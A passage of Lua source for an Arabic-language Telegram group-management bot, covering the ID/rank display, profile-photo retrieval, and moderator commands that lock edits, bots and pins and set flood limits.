                  texts = '🚦|| المعرف غير صحيح •'
                end
                faederdx(msg.chat_id_, msg.id_, 1, texts, 1, 'html')
              end
            end
            resolve_username(ap[2],invite_by_username)
          end
        end
        --------------------------------------faeder---------------------------------------------------------
        if text:match("^[Ii]nvite (%d+)$") then
          local ap = {string.match(text, "^([Ii]nvite) (%d+)$")}
          add_user(msg.chat_id_, ap[2], 5)
        end
        ---------------------------------faeder--------------------------------------------------------------
        if msg.reply_to_message_id_ ~= 0 then
          return ""
        else
if text:match("^[Ii]d$") or text:match("^ايدي$") then
function getmepar(extra,result,success) 
if result.username_ then username = '@'..result.username_ else username = ' لا يوجد 🎍 ' end
local user_msgs = database:get('user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local msguser = tonumber(database:get('user:msgs'..msg.chat_id_..':'..msg.sender_user_id_))
local function getproen(extra, result, success)
if database:get('getidstatus'..msg.chat_id_) == "Photo" then
if result.photos_[0] then
if is_sudo(msg) then
t = 'مطور اساسي 🍷'
elseif is_admin(msg.sender_user_id_) then
t = 'مطور فالرتبه الثالثه 🚩'
elseif is_onall(msg.sender_user_id_) then
t = 'مدير عام 🚩'
elseif is_moall(msg.sender_user_id_) then
t = 'ادمن عام 🚩'
elseif is_vpall(msg.sender_user_id_) then
t = 'مميز عام🚩'
elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
t = 'منشئ الكروب 💷'
elseif is_donky(msg.sender_user_id_, msg.chat_id_) then
t = 'مطي معدل 😹💔'
elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
t = 'مدير البوت 💷'
elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
t = 'ادمن البوت 💷'
elseif is_vipmem(msg.sender_user_id_, msg.chat_id_) then
t = 'عضو مميز 💷'
else
t = 'عضو متخلف 🗳'
end
local fae = '💳⁞ رتـبتـك ~ « '..t..' »\n🖇⁞ ايـديـك ~ « '..msg.sender_user_id_..' »\n🚦⁞ معـرفك ~ « ' ..username..' »\n📽⁞ صورك ~ « '..result.total_count_..' »\n📈⁞ تـفاعلك ~ « '..formsgg(msguser)..' »\n📬⁞ رسائلك ~« '..user_msgs
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_,fae,msg.id_,msg.id_)
else
faederdx(msg.chat_id_, msg.id_, 1, '🚧⁞ ~ « لا تمتلك صوره شخصيه »\n\n🖇⁞ ايـديـك ~ « '..msg.sender_user_id_..' »\n🚦⁞ معـرفك ~ « ' ..username..' »\n📽⁞ صورك ~ « '..result.total_count_..' »\n📈⁞ تـفاعلك ~ « '..formsgg(msguser)..' »\n📬⁞ رسائلك ~« '..user_msgs, 1, 'md')
end
end
if database:get('getidstatus'..msg.chat_id_) == "Simple" then
faederdx(msg.chat_id_, msg.id_, 1, '🖇⁞ ايـديـك ~ « '..msg.sender_user_id_..' »\n🚦⁞ معـرفك ~ « ' ..username..' »\n📽⁞ صورك ~ « '..result.total_count_..' »\n📈⁞ تـفاعلك ~ « '..formsgg(msguser)..' »\n📬⁞ رسائلك ~« '..user_msgs, 1, 'md')
end
if not database:get('getidstatus'..msg.chat_id_) then
faederdx(msg.chat_id_, msg.id_, 1, '🖇⁞ ايـديـك ~ « '..msg.sender_user_id_..' »\n🚦⁞ معـرفك ~ « ' ..username..' »\n📽⁞ صورك ~ « '..result.total_count_..' »\n📈⁞ تـفاعلك ~ « '..formsgg(msguser)..' »\n📬⁞ رسائلك ~« '..user_msgs, 1, 'md')
end
end
tdcli_function ({
ID = "GetUserProfilePhotos",
user_id_ = msg.sender_user_id_,
offset_ = 0,
limit_ = 1
}, getproen, nil)
end
getUser(msg.sender_user_id_, getmepar)  
end   
end
        ----------------------------------------faeder-------------------------------------------------------
        local text = msg.content_.text_:gsub('جلب الصوره','Getprofilestatus')
        if is_momod(msg.sender_user_id_, msg.chat_id_) then
          if text:match("^[Gg]etprofilestatus (.*)$") then
            local status = {string.match(text, "^([Gg]etprofilestatus) (.*)$")}
            if status[2] == "active" or status[2] == "تفعيل" then
              if database:get('getpro:'..msg.chat_id_) == "Active" then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚏 ⁞ Get profile photo is *already* actived •', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '️🚏 ⁞ جلب الصوره الشخصيه مفعل مسبقا ✅', 1, 'md')
                end
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚏 ⁞ Get profile photo has been changed to *active* •', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '️🚏 ⁞ تم تفعيل جلب الصوره الشخصيه ✅', 1, 'md')
                end
                database:set('getpro:'..msg.chat_id_,'Active')
              end
            end
            if status[2] == "deactive" or status[2] == "تعطيل" then
              if database:get('getpro:'..msg.chat_id_) == "Deactive" then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚏 ⁞ Get profile photo is *already* deactived •', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '️🚏 ⁞ جلب الصوره الشخصيه معطل مسبقا ✅', 1, 'md')
                end
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚏 ⁞ Get profile photo has been change to *deactive* •', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '️🚏 ⁞ تم تعطيل جلب الصوره الشخصيه ✅', 1, 'md')
                end
                database:set('getpro:'..msg.chat_id_,'Deactive')
              end
            end
          end
        end
        ------------------------------------------faeder-----------------------------------------------------
        if text:match("^صورتي (%d+)$") then
          local pronumb = {string.match(text, "^([Gg]etpro) (%d+)$")}
          local function gproen(extra, result, success)
            if not is_momod(msg.sender_user_id_, msg.chat_id_) and database:get('getpro:'..msg.chat_id_) == "Deactive" then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ Get profile photo is deactive •", 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '️🚏 ⁞ جلب الصوره الشخصيه معطل  ✅', 1, 'md')
              end
            else
              if pronumb[2] == '1' then
                if result.photos_[0] then
                  sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_)
                else
                  if database:get('lang:gp:'..msg.chat_id_) then
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have profile photo •", 1, 'md')
                  else
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك صوره شخصيه ❎", 1, 'md')
                  end
                end
              elseif pronumb[2] == '2' then
                if result.photos_[1] then
                  sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[1].sizes_[1].photo_.persistent_id_)
                else
                  if database:get('lang:gp:'..msg.chat_id_) then
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have 2 profile photo •", 1, 'md')
                  else
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
                  end
                end
              elseif pronumb[2] == '3' then
                if result.photos_[2] then
                  sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[2].sizes_[1].photo_.persistent_id_)
                else
                  if database:get('lang:gp:'..msg.chat_id_) then
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have 3 profile photo •", 1, 'md')
                  else
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
                  end
                end
              elseif pronumb[2] == '4' then
                if result.photos_[3] then
                  sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[3].sizes_[1].photo_.persistent_id_)
                else
                  if database:get('lang:gp:'..msg.chat_id_) then
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have 4 profile photo •", 1, 'md')
                  else
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
                  end
                end
              elseif pronumb[2] == '5' then
                if result.photos_[4] then
                  sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[4].sizes_[1].photo_.persistent_id_)
                else
                  if database:get('lang:gp:'..msg.chat_id_) then
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't 5 have profile photo •", 1, 'md')
                  else
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
                  end
                end
              elseif pronumb[2] == '6' then
                if result.photos_[5] then
                  sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[5].sizes_[1].photo_.persistent_id_)
                else
                  if database:get('lang:gp:'..msg.chat_id_) then
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have 6 profile photo •", 1, 'md')
                  else
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
                  end
                end
              elseif pronumb[2] == '7' then
                if result.photos_[6] then
                  sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[6].sizes_[1].photo_.persistent_id_)
                else
                  if database:get('lang:gp:'..msg.chat_id_) then
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have 7 profile photo •", 1, 'md')
                  else
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
                  end
                end
              elseif pronumb[2] == '8' then
                if result.photos_[7] then
                  sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[7].sizes_[1].photo_.persistent_id_)
                else
                  if database:get('lang:gp:'..msg.chat_id_) then
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have 8 profile photo •", 1, 'md')
                  else
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
                  end
                end
              elseif pronumb[2] == '9' then
                if result.photos_[8] then
                  sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[8].sizes_[1].photo_.persistent_id_)
                else
                  if database:get('lang:gp:'..msg.chat_id_) then
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have 9 profile photo •", 1, 'md')
                  else
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
                  end
                end
              elseif pronumb[2] == '10' then
                if result.photos_[9] then
                  sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[9].sizes_[1].photo_.persistent_id_)
                else
                  if database:get('lang:gp:'..msg.chat_id_) then
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have 10 profile photo •", 1, 'md')
                  else
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
                  end
                end
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ I just can get last 10 profile photos •", 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞لا يمكنني ان ارسل لك اكثر من 10 صور ❎", 1, 'md')
                end
              end
            end
          end
          tdcli_function ({
            ID = "GetUserProfilePhotos",
            user_id_ = msg.sender_user_id_,
            offset_ = 0,
            limit_ = pronumb[2]
          }, gproen, nil)
        end
        if text:match("^صورتي (%d+)$") then
          local pronumb = {string.match(text, "^(صورتي) (%d+)$")}
          if not is_momod(msg.sender_user_id_, msg.chat_id_) and database:get('getpro:'..msg.chat_id_) == "Deactive" then
            if database:get('lang:gp:'..msg.chat_id_) then
              faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ Get profile photo is deactive •", 1, 'md')
            else
              faederdx(msg.chat_id_, msg.id_, 1, '️🚏 ⁞ جلب الصوره الشخصيه معطل  ✅', 1, 'md')
            end
          else
            local function gprofa(extra, result, success)
              --vardump(result)
              if pronumb[2] == '1' then
                if result.photos_[0] then
                  sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_)
                else
                  if database:get('lang:gp:'..msg.chat_id_) then
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have profile photo •", 1, 'md')
                  else
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك صوره شخصيه ❎", 1, 'md')
                  end
                end
              elseif pronumb[2] == '2' then
                if result.photos_[1] then
                  sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[1].sizes_[1].photo_.persistent_id_)
                else
                  if database:get('lang:gp:'..msg.chat_id_) then
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have 2 profile photo •", 1, 'md')
                  else
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
                  end
                end
              elseif pronumb[2] == '3' then
                if result.photos_[2] then
                  sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[2].sizes_[1].photo_.persistent_id_)
                else
                  if database:get('lang:gp:'..msg.chat_id_) then
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have 3 profile photo •", 1, 'md')
                  else
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
                  end
                end
              elseif pronumb[2] == '4' then
                if result.photos_[3] then
                  sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[3].sizes_[1].photo_.persistent_id_)
                else
                  if database:get('lang:gp:'..msg.chat_id_) then
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have 4 profile photo •", 1, 'md')
                  else
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
                  end
                end
              elseif pronumb[2] == '5' then
                if result.photos_[4] then
                  sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[4].sizes_[1].photo_.persistent_id_)
                else
                  if database:get('lang:gp:'..msg.chat_id_) then
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't 5 have profile photo •", 1, 'md')
                  else
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
                  end
                end
              elseif pronumb[2] == '6' then
                if result.photos_[5] then
                  sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[5].sizes_[1].photo_.persistent_id_)
                else
                  if database:get('lang:gp:'..msg.chat_id_) then
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have 6 profile photo •", 1, 'md')
                  else
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
                  end
                end
              elseif pronumb[2] == '7' then
                if result.photos_[6] then
                  sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[6].sizes_[1].photo_.persistent_id_)
                else
                  if database:get('lang:gp:'..msg.chat_id_) then
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have 7 profile photo •", 1, 'md')
                  else
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
                  end
                end
              elseif pronumb[2] == '8' then
                if result.photos_[7] then
                  sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[7].sizes_[1].photo_.persistent_id_)
                else
                  if database:get('lang:gp:'..msg.chat_id_) then
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have 8 profile photo •", 1, 'md')
                  else
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
                  end
                end
              elseif pronumb[2] == '9' then
                if result.photos_[8] then
                  sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[8].sizes_[1].photo_.persistent_id_)
                else
                  if database:get('lang:gp:'..msg.chat_id_) then
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have 9 profile photo •", 1, 'md')
                  else
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
                  end
                end
              elseif pronumb[2] == '10' then
                if result.photos_[9] then
                  sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[9].sizes_[1].photo_.persistent_id_)
                else
                  if database:get('lang:gp:'..msg.chat_id_) then
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ You don't have 10 profile photo •", 1, 'md')
                  else
                    faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ انت لا تمتلك الصوره الشخصيه التي طلبت رقمها ❎", 1, 'md')
                  end
                end
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞ I just can get last 10 profile photos •", 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, "🚏 ⁞لا يمكنني ان ارسل لك اكثر من 10 صور ❎", 1, 'md')
                end
              end
            end
          end
          tdcli_function ({
            ID = "GetUserProfilePhotos",
            user_id_ = msg.sender_user_id_,
            offset_ = 0,
            limit_ = pronumb[2]
          }, gprofa, nil)
        end
        ----------------------------------faeder-------------------------------------------------------------
        if is_momod(msg.sender_user_id_, msg.chat_id_) then
          if text:match("^[Ll]ock (.*)$") or text:match("^قفل (.*)$") and is_momod(msg.sender_user_id_, msg.chat_id_) then
            local lockpt = {string.match(text, "^([Ll]ock) (.*)$")}
                if is_leaderid(msg.sender_user_id_) then
              tar = 'المطور ✨'
            elseif is_sudoid(msg.sender_user_id_) then
              tar = 'المطور ✨'
            elseif is_admin(msg.sender_user_id_) then
              tar = 'المطور ✨'
              elseif is_onall(msg.sender_user_id_) then
              tar = 'المدير ✨'
              elseif is_moall(msg.sender_user_id_) then
              tar = 'الادمن ✨'
              elseif is_monsh(msg.sender_user_id_, msg.chat_id_) then
              tar = 'المنشئ ✨'
            elseif is_owner(msg.sender_user_id_, msg.chat_id_) then
              tar = 'المدير ✨'
            elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
              tar = 'الادمن ✨'          
            end
            local lockptf = {string.match(text, "^(قفل) (.*)$")}
            if lockpt[2] == "edit" or lockptf[2] == "التعديل" then
              if not database:get('editmsg'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then                  
               faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock edit ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل التعديل • \n🎗⁞ بواسطه «'..result.first_name_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(result.first_name_))
                end
                database:set('editmsg'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ edit is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل التعديل سابقا ✔️', 1, 'md')
                end
              end
            end
            
            if lockpt[2] == "cmd" or lockptf[2] == "الشارحه" then
              if not database:get('bot:cmds'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock cmd ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل الشارحه • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:set('bot:cmds'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ cmd is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل الشارحه سابقا ✔️', 1, 'md')
                end
              end
            end
            if lockpt[2] == "bots" or lockptf[2] == "البوتات" then
              if not database:get('bot:bots:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock bots ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل البوتات • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:set('bot:bots:mute'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ bots is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل البوتات سابقا ✔️', 1, 'md')
                end
              end
            end
            if lockpt[2] == "bots ban" or lockptf[2] == "البوتات بالطرد" then
              if not database:get('bot:bots:ban'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock bots ban ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل البوتات بالطرد • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 64, string.len(msg.sender_user_id_))
                end
                database:set('bot:bots:ban'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ bots is already locked ban ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل البوتات بالطرد سابقا ✔️', 1, 'md')
                end
              end
            end
            if lockpt[2] == "bots keed" or lockptf[2] == "البوتات بالتقييد" then
              if not database:get('keed_bots'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock bots keed ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل البوتات بالتقييد • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 66, string.len(msg.sender_user_id_))
                end
                database:set('keed_bots'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ bots is already locked keed ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل البوتات بالتقييد سابقا ✔️', 1, 'md')
                end
              end
            end
            if lockpt[2] == "flood" or lockptf[2] == "التكرار" then
              if not database:get('anti-flood:'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock flood ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل التكرار • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:set('anti-flood:'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ flood is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل التكرار سابقا ✔️', 1, 'md')
                end
              end
            end
            if lockpt[2] == "pin" or lockptf[2] == "التثبيت" then
              if not database:get('bot:pin:mute'..msg.chat_id_) then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Has been lock pin ☑️', 1, 'md')
                else
                  local faeder = '🚦⁞ رتبتك : '..tar..' •\n🎖⁞ تم قفل التثبيت • \n🎗⁞ بواسطه «'..msg.sender_user_id_..'» •'
            faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, faeder, 57, string.len(msg.sender_user_id_))
                end
                database:set('bot:pin:mute'..msg.chat_id_,true)
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ pin is already locked ✔️', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم قفل التثبيت سابقا ✔️', 1, 'md')
                end
              end
            end
          end
          end
        -----------------------------------faeder------------------------------------------------------------
        local text = msg.content_.text_:gsub('ضع تكرار','Setflood')
        if is_momod(msg.sender_user_id_, msg.chat_id_) then
          if text:match("^[Ss]etflood (%d+)$") then
            local floodmax = {string.match(text, "^([Ss]etflood) (%d+)$")}
            if tonumber(floodmax[2]) < 2 then
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Select a number greater than 2 ', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '🎖⁞ قم بتحديد تكرار اكبر من 2 •', 1, 'md')
              end
            else
              if database:get('lang:gp:'..msg.chat_id_) then
                faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Flood sensitivity change to '..floodmax[2]..' ', 1, 'md')
              else
                faederdx(msg.chat_id_, msg.id_, 1, '🚏⁞ تم تحديد التكرار للعدد '..floodmax[2]..' في المجموعه ✅', 1, 'md')
              end
              database:set('flood:max:'..msg.chat_id_,floodmax[2])
            end
          end
          ------------------------------------faeder-----------------------------------------------------------
          local text = msg.content_.text_:gsub('ضع التكرار','Setstatus')
          if text:match("^[Ss]etstatus (.*)$") then
            local status = {string.match(text, "^([Ss]etstatus) (.*)$")}
            if status[2] == "kick" or status[2] == "بالطرد" then
              if database:get('floodstatus'..msg.chat_id_) == "Kicked" then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '??⁞ Flood status is *already* on Kicked ', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم وضع التكرار بالطرد فعلا 🚏', 1, 'md')
                end
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Flood status change to *Kicking* ', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم وضع التكرار بالطرد 🚏', 1, 'md')
                end
                database:set('floodstatus'..msg.chat_id_,'Kicked')
              end
            end
            if status[2] == "del" or status[2] == "بالمسح" then
              if database:get('floodstatus'..msg.chat_id_) == "DelMsg" then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Flood status is *already* on Deleting ', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم وضع التكرار بالمسح فعلا🚏', 1, 'md')
                end
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Flood status has been change to *Deleting* ', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم وضع التكرار بالمسح 🚏', 1, 'md')
                end
                database:set('floodstatus'..msg.chat_id_,'DelMsg')
              end
            end
          end
          ---------------------------------------faeder--------------------------------------------------------
          local text = msg.content_.text_:gsub('ضع الايدي','Getidstatus')
          if text:match("^[Gg]etidstatus (.*)$") then
            local status = {string.match(text, "^([Gg]etidstatus) (.*)$")}
            if status[2] == "photo" or status[2] == "بالصوره" then
              if database:get('getidstatus'..msg.chat_id_) == "Photo" then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Get id status is *already* on Photo ', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم وضع الايدي بالصوره فعلا •', 1, 'md')
                end
              else
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Get ID status has been changed to *Photo* ', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم وضع الايدي بالصوره •', 1, 'md')
                end
                database:set('getidstatus'..msg.chat_id_,'Photo')
              end
            end
            if status[2] == "simple" or status[2] == "بدون صوره" then
              if database:get('getidstatus'..msg.chat_id_) == "Simple" then
                if database:get('lang:gp:'..msg.chat_id_) then
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ Get ID status is *already* on Simple ', 1, 'md')
                else
                  faederdx(msg.chat_id_, msg.id_, 1, '🚦⁞ تم وضع الايدي بدون صوره فعلا •', 1, 'md')
                end
              else
